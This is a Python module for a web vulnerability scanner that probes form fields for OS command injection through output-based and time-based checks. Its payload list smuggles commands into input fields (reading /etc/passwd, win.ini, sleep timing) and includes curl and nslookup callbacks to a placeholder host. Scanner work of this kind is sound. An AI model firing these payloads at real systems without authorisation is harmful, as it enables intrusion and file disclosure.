"""
Command Injection (OS Command Injection / RCE) vulnerability scanner.

Detects command injection by injecting OS command separators and commands,
then checking for expected output patterns in responses.
"""

from typing import List, Optional
from pathlib import Path
import re
import time

from scanner.base import BaseScanner
from crawler.crawler import Form
from models.finding import Finding
from utils.http import HTTPClient
from utils.logger import get_logger
from config import (
    PAYLOAD_DIR,
    CMDI_PAYLOAD_FILE,
    CWE_MAPPINGS,
    OWASP_MAPPINGS,
)

logger = get_logger(__name__)

# Built-in command injection payloads
CMDI_PAYLOADS = [
    # Command separators (Linux)
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "\nid",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    # Command separators (Windows)
    "& whoami",
    "| whoami",
    "&& whoami",
    "| type C:\\Windows\\win.ini",
    # Time-based detection
    "; sleep 5",
    "| sleep 5",
    "& sleep 5",
    "&& sleep 5",
    "$(sleep 5)",
    "`sleep 5`",
    "& timeout /t 5",
    "| ping -n 5 127.0.0.1",
    # Blind with DNS/HTTP callback
    "; nslookup cmdi-test.example.com",
    "| curl http://cmdi-test.example.com",
    # Encoding bypass
    ";+id",
    "%0aid",
    "%0a%0did",
    "${IFS}id",
    ";\tcat\t/etc/passwd",
]

# Indicators of successful command execution
CMDI_INDICATORS = [
    # id command output
    (r"uid=\d+\(\w+\)\s+gid=\d+", "OS 'id' command output"),
    # whoami
    (r"root|www-data|apache|nginx|daemon|nobody", "OS username in response"),
    # /etc/passwd
    (r"root:.*:0:0:", "Linux /etc/passwd file content"),
    # Windows
    (r"\[fonts\]", "Windows win.ini content"),
    (r"\[extensions\]", "Windows system file content"),
    # Generic
    (r"total \d+\s+drwx", "Directory listing (ls -la output)"),
    (r"Volume Serial Number", "Windows dir command output"),
    (r"Directory of C:\\", "Windows dir command output"),
]

# Time-based payloads for blind detection
TIME_PAYLOADS = [
    ("; sleep {delay}", 'Linux'),
    ("| sleep {delay}", 'Linux'),
    ("$(sleep {delay})", 'Linux'),
    ("`sleep {delay}`", 'Linux'),
    ("& timeout /t {delay}", 'Windows'),
    ("| ping -n {delay} 127.0.0.1", 'Windows'),
]


class CommandInjectionScanner(BaseScanner):
    """
    OS Command Injection scanner.

    Tests form fields for command injection vulnerabilities using:
    1. Output-based detection (checking for command output in response)
    2. Time-based detection (measuring response delay from sleep/ping)
    """

    def __init__(
        self,
        http_client: HTTPClient,
        payload_file: Optional[Path] = None
    ):
        super().__init__(http_client)
        self.payloads = self._load_payloads(payload_file)
        logger.info(f"Command Injection Scanner initialized with {len(self.payloads)} payloads")

    @property
    def scanner_name(self) -> str:
        return "Command Injection"

    def _load_payloads(self, payload_file: Optional[Path]) -> List[str]:
        """Load command injection payloads."""
        if payload_file is None:
            payload_file = PAYLOAD_DIR / CMDI_PAYLOAD_FILE

        payloads = self._load_payloads_from_file(payload_file)
        if not payloads:
            payloads = CMDI_PAYLOADS

        return payloads

    def _check_cmdi_indicators(self, response_text: str, baseline_text: str) -> Optional[tuple]:
        """Check response for command execution indicators."""
        for pattern, description in CMDI_INDICATORS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                # Ensure this wasn't in the baseline
                if baseline_text and re.search(pattern, baseline_text, re.IGNORECASE):
                    continue
                evidence = response_text[max(0, match.start() - 20):match.end() + 50]
                return evidence.strip()[:200], description
        return None

    def _check_time_based(self, form: Form, field_name: str) -> Optional[Finding]:
        """Test for time-based blind command injection."""
        delay = 5

        # Measure baseline
        baseline_data = self._build_form_data(form, field_name, "baseline")
        start = time.time()
        self._submit_form(form, baseline_data)
        baseline_time = time.time() - start

        for payload_template, os_type in TIME_PAYLOADS:
            payload = payload_template.replace('{delay}', str(delay))
            form_data = self._build_form_data(form, field_name, payload)

            start = time.time()
            response = self._submit_form(form, form_data)
            elapsed = time.time() - start

            if elapsed >= (baseline_time + delay - 1):
                evidence = (
                    f"Response delayed by {elapsed:.2f}s "
                    f"(baseline: {baseline_time:.2f}s, expected: {delay}s)"
                )
                return Finding(
                    vuln_type='RCE',
                    url=form.action,
                    parameter=field_name,
                    payload=payload,
                    evidence=evidence,
                    severity='CRITICAL',
                    method=form.method,
                    description=f'Time-based command injection in {field_name} ({os_type})',
                    remediation='Never pass user input to OS commands. Use language-native APIs '
                                'instead of shell commands. If shell commands are unavoidable, '
                                'use strict allowlists and parameterized command execution.',
                    cwe_id=CWE_MAPPINGS.get('RCE', ''),
                    owasp_category=OWASP_MAPPINGS.get('RCE', ''),
                    confidence='MEDIUM',
                    scanner_module='CommandInjectionScanner',
                    context=f'time_based,os={os_type}',
                    tags=['rce', 'command-injection', 'time-based', os_type.lower()],
                )
        return None

    def scan_form(self, form: Form) -> List[Finding]:
        """Scan form for command injection vulnerabilities."""
        findings = []
        logger.info(f"Scanning form {form.method} {form.action} for Command Injection")

        testable_fields = self._get_testable_fields(form)
        if not testable_fields:
            return findings

        for field in testable_fields:
            field_vulnerable = False

            # Get baseline
            baseline_data = self._build_form_data(form, field.name, "normal_value")
            baseline_resp = self._submit_form(form, baseline_data)
            baseline_text = baseline_resp.text if baseline_resp else ""

            # Output-based detection
            for payload in self.payloads:
                if field_vulnerable:
                    break

                form_data = self._build_form_data(form, field.name, payload)

                try:
                    response = self._submit_form(form, form_data)
                    if not response:
                        continue

                    result = self._check_cmdi_indicators(response.text, baseline_text)
                    if result:
                        evidence, description = result
                        finding = Finding(
                            vuln_type='RCE',
                            url=form.action,
                            parameter=field.name,
                            payload=payload,
                            evidence=evidence,
                            severity='CRITICAL',
                            method=form.method,
                            description=f'Command Injection in {field.name}: {description}',
                            remediation='Never pass user input to OS commands. Use language-native '
                                        'APIs. Apply strict input validation and use allowlists.',
                            cwe_id=CWE_MAPPINGS.get('RCE', ''),
                            owasp_category=OWASP_MAPPINGS.get('RCE', ''),
                            confidence='HIGH',
                            scanner_module='CommandInjectionScanner',
                            tags=['rce', 'command-injection'],
                        )
                        findings.append(finding)
                        logger.warning(f"Command injection in {form.action} param '{field.name}'")
                        field_vulnerable = True

                except Exception as e:
                    logger.error(f"Error testing command injection on {form.action}: {e}")

            # Time-based detection if no output-based finding
            if not field_vulnerable:
                try:
                    finding = self._check_time_based(form, field.name)
                    if finding:
                        findings.append(finding)
                        logger.warning(f"Blind command injection in {form.action} param '{field.name}'")
                except Exception as e:
                    logger.error(f"Error in time-based command injection test: {e}")

        return findings
